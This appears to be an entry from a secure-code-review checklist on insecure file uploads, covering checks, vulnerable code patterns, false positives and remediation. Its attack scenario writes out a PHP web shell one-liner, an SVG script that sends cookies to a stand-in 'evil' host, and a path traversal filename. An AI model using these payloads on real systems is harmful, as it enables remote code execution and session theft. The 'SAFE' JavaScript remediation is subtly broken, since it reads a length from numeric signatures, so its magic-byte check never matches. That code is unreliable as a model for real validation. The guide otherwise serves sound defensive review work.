---
id: P86
name: UploadValidation
refs: ASVS V12.4.x / WSTG-INPV-11, WSTG-ATHZ-04 / CS: File Upload, Protect File Upload Against Vulnerabilities
---

# P86 — UploadValidation

## Preconditions

The code handles file uploads.


## Overview
Insecure file upload lets an attacker deliver a malicious payload onto the server under a name and location the application will later store, serve, or execute. The root cause is almost always **trusting client-supplied metadata** — original filename, declared `Content-Type`, or an `accept` attribute — instead of independently verifying the actual bytes. The failure modes compound: a web shell (`.php`, `.jsp`, `.aspx`) stored under the web root yields remote code execution; an SVG or HTML file served with the wrong `Content-Type` yields stored XSS; an oversized or pathological ("decompression bomb" / "pixel bomb") upload yields denial of service. Extension block-lists are routinely bypassed (`.php5`, `.phtml`, `.svg` with embedded script, double extensions `file.php.png`, null bytes in legacy stacks), so defense must combine **extension allow-listing, content-type sniffing against magic bytes, size capping, server-side re-encoding, and storage outside the web root with a non-executable, random name**.

## What to check
- Is there **any** server-side validation at all, or is the only guard the client-side `accept` attribute / a JavaScript check? Client-only checks are bypassable in seconds.
- Is the extension validated against a strict **allow-list** (e.g. `.jpg`, `.png`, `.pdf`) rather than a block-list of known-bad extensions? Block-lists miss variants.
- Is the file's real content verified via **magic bytes / file signature**, not the `Content-Type` header or the `.extension` the client sent? Both are attacker-controlled.
- Is there a hard **size limit** enforced server-side (and a request-body / multipart limit on the reverse proxy) to prevent resource exhaustion and DoS?
- Where is the file written? Under the **web root** (reachable/executable) or **outside** it, served via a download endpoint that forces `Content-Disposition: attachment`?
- Is the stored filename **server-generated** (random UUID, content hash) and **not** the user-supplied original name? Original names enable path traversal (`../../etc/passwd`) and predictable URLs.
- Are uploaded files **stored with non-executable permissions** and, for images, **re-encoded** through a sanitizing library (ImageMagick/Pillow `verify()`-then-save, Sharp) to strip embedded payloads and EXIF/metadata?
- Are dangerous types (`image/svg+xml`, `text/html`, `application/pdf` with JS) rejected, or — if required — rendered/served in a way that neutralizes active content (SVG sanitized, PDF served as download, HTML never served inline from the app origin)?
- Is the upload endpoint protected by authentication and authorization so anonymous uploads can't be abused for storage/exfiltration?
- For "decompression / pixel bomb" risk: is the decompressed size / pixel count capped before processing, not just the compressed upload size?
- Is the temp directory used during parsing outside the web root and cleaned up?

## Static signals
Storing raw upload by client-provided name (no validation):
- Node/Express (mulberry/multer): `fs.writeFile('uploads/' + req.file.originalname, req.file.buffer)`
- Express-formidable: `fs.writeFileSync(path.join(uploadDir, files.upload.name), fs.readFileSync(files.upload.path))`
- Python (Flask/Django): `f.save(os.path.join(UPLOAD_DIR, f.filename))`, `default_storage.save(request.FILES['u'].name, request.FILES['u'])`
- Java (Spring/commons-fileupload): `new File(uploadDir + "/" + item.getName())`, `transferTo(new File(dir + "/" + file.getOriginalFilename()))`
- PHP: `move_uploaded_file($_FILES['u']['tmp_name'], "up/" . $_FILES['u']['name'])` (name from client)
- Ruby/Rails: `File.open(Rails.root.join('public', 'up', upload.original_filename), 'wb')`
- Go: `io.Copy(file, r.FormFile("u"))` with `handler.Header.Get("Content-Type")` trusted
- .NET: `Path.Combine(_env.WebRootPath, file.FileName)` then `file.CopyTo(stream)`

Validation that trusts client metadata only:
- `if (req.file.mimetype !== 'image/png')` — `mimetype`/`Content-Type` is attacker-controlled
- `if (path.extname(req.file.originalname) === '.jpg')` — extension is attacker-controlled
- `accept=".jpg,.png"` in HTML — purely client-side
- Python: checking `file.content_type` or `file.name.endswith(...)` without magic-byte verification

Missing size limits:
- No `app.use(express.json({ limit: ... }))` / no `multer({ limits: { fileSize } })`
- No `maxFileSize` in Servlet `MultipartConfig` / no `client_max_body_size` in nginx
- PHP `upload_max_filesize`/`post_max_size` far larger than business needs, no app-layer check

Web-root storage / executable path:
- Writes under `public/`, `static/`, `www/`, `WebRoot`, `htdocs` — file becomes directly fetchable and (for `.php`/`.jsp`) executable
- Permissions `chmod` not applied, inheriting executable bits

## False positives
- The pipeline verifies **allow-listed extension + magic-byte content-type + size limit + re-encoding + out-of-webroot storage + non-exec name + AV scan** — full layered defense; flag only the missing layers.
- A framework wraps uploads securely: e.g. Django `ImageField` (validates image open), ActiveStorage/CarrierWave with content-type allow-list + virus scan, Spring with a configured `MultipartResolver` limit plus an explicit validator.
- The "upload" is purely internal/seed data generated server-side, never request-controlled.
- File is downloaded (never served inline from app origin) with `Content-Type` not set to an executable/HTML type and `Content-Disposition: attachment` — stored XSS / execution is neutralized even if validation is light.
- A WAF / reverse proxy enforces size and content-type allow-listing at the edge and you can confirm the app trusts nothing further — still confirm the app does not weaken this.

## Attack scenario
1. Attacker finds an avatar/upload endpoint that trusts the extension and stores files under `/var/www/app/uploads/`.
2. They upload `shell.php` (or `shell.php.png` to bypass a naive block-list) containing `<?php system($_GET['c']); ?>`, declaring `Content-Type: image/jpeg` and a `.jpg`-ish header to pass weak checks.
3. The server stores it as `uploads/shell.php` (or a name the server then routes to the PHP/CGI handler).
4. Attacker requests `https://app.example.com/uploads/shell.php?c=id` — the handler executes the file → remote code execution.
5. Variant A (stored XSS): upload `evil.svg` containing `<script>fetch('//evil/?c='+document.cookie)</script>`; the app serves it as `image/svg+xml` inline → script runs in the app origin.
6. Variant B (DoS): upload a 50 GB file or a 10 MB "decompression bomb" that expands to 500 GB during image processing, exhausting memory/disk.
7. Variant C (path traversal): original filename `../../../../etc/passwd` overwrites a system file if the path is joined naively.

## Impact
- **Confidentiality**: web shell → full source/credential/DB read; SVG/HTML upload → session theft via stored XSS; overwritten config → secret leakage.
- **Integrity**: arbitrary file write (deface, backdoor, alter business data), code execution to tamper with anything on the host.
- **Availability**: disk/memory exhaustion from oversized or bomb uploads; service outage from overwritten binaries.
- Severity scales with where files land: RCE under the web root is typically Critical; stored XSS via SVG/HTML is High; DoS-only is Medium-High. An admin-reachable upload that drops a shell is full compromise.

## Remediation
Validate every layer server-side, store outside the web root, and never trust the client name:
```js
// VULNERABLE — trusts client name + extension, writes under web root
app.post('/upload', upload.single('avatar'), (req, res) => {
  fs.writeFileSync('public/uploads/' + req.file.originalname, req.file.buffer);
  res.send('ok');
});

// SAFE — allow-list + magic bytes + size + re-encode + random name + out-of-webroot
const ALLOWED = { 'jpg': [0xFFD8FF], 'png': [0x89504E47] };
app.post('/upload', upload.single('avatar'), async (req, res) => {
  const f = req.file;
  if (!f || f.size > 2 * 1024 * 1024) return res.status(413).end();
  const ext = Object.keys(ALLOWED).find(e =>
    ALLOWED[e].some(sig => f.buffer.subarray(0, sig.length / 2)
      .equals(Buffer.from(sig.toString(16), 'hex'))));
  if (!ext) return res.status(415).end();         // magic-byte allow-list
  const clean = await sharp(f.buffer).rotate().toBuffer(); // re-encode / strip payload
  const name = crypto.randomUUID() + '.' + ext;   // server-generated name
  await fs.writeFile(path.join(STORE_DIR, name), clean);   // outside web root
  res.json({ url: `/files/${name}` });            // served via forced-download endpoint
});
```
Defense-in-depth: store on a separate domain / object store with a strict Content-Security-Policy, scan with an antivirus engine (ClamAV), cap decompressed/pixel size before image processing, and serve all uploads with `Content-Disposition: attachment` and a non-executable `Content-Type`.

## References
- OWASP ASVS V12.4.x — File upload requirements (allow-list, magic bytes, size limit, out-of-webroot storage)
- OWASP WSTG-INPV-11 — Testing for File Upload; WSTG-ATHZ-04 — Bypassing authorization schema / path traversal on stored names
- OWASP Cheat Sheets: File Upload, Protect File Upload Against Vulnerabilities, Unrestricted File Upload
